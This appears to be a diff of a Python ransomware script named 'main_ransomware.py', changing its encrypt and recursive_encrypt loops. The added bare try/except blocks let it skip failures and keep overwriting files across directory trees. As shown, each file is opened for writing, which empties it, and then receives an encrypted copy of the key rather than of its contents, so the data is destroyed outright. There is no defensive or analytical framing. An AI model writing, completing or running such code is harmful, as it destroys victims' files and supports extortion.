@@ -58,12 +58,16 @@ def encrypt(dir):
         if not os.path.isfile(file_name):
             file_number -= 1
             continue
+        
+        try:
+            with open(file_name, 'wb') as encrypted_file:
 
-        with open(file_name, 'wb') as encrypted_file:
+                fernet = Fernet(key=key)
+                encrypted_text = Fernet.encrypt(fernet, key)
+                encrypted_file.write(encrypted_text) 
 
-            fernet = Fernet(key=key)
-            encrypted_text = Fernet.encrypt(fernet, key)
-            encrypted_file.write(encrypted_text) 
+        except:
+            continue
 
         advancment = (100 * (file_id + 1)) / file_number
         loadbar = f"[{file_id + 1}/{file_number}]" + "[" + "#" * int(advancment) + " " * (100 - int(advancment)) + "]" + " " + f"{advancment}%" + " " + f"Encrypting {file_name}..."
@@ -96,12 +100,15 @@ def recursive_encrypt(root):
             if all_files[dir_id][2][file_id] == 'key.key' or all_files[dir_id][2][file_id] == 'main_ransomware.py':
                 continue
 
-            with open(file_name, 'wb') as encrypted_file:
+            try:
+                with open(file_name, 'wb') as encrypted_file:
 
-                fernet = Fernet(key=key)
-                encrypted_text = fernet.encrypt(key)
-                encrypted_file.write(encrypted_text)
+                    fernet = Fernet(key=key)
+                    encrypted_text = fernet.encrypt(key)
+                    encrypted_file.write(encrypted_text)
                 
+            except:
+                continue
         total_advancment = int((100 * (dir_id + 1)) / len(all_files))
         current_folder = all_files[dir_id][0].split("/")[-1]
 
@@ -124,3 +131,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+    
